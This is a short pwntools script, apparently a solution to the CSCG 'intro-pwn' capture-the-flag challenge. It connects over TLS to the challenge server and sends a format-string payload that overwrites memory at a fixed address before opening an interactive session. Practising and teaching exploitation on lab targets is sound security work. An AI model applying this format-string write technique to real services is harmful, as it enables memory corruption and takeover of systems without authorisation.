from pwn import *
elf = context.binary = ELF("./intro-fmt")
# r = process()
host = "e47d8420e2d183ada430e48c-1024-intro-pwn-2.challenge.cscg.live"
port = 1337

r = remote(host, port, ssl=True)
bug = 0x40406c
rop = ROP(context.binary)
r.sendline(fmtstr_payload(6,{bug:b"cihuy"}))
r.interactive()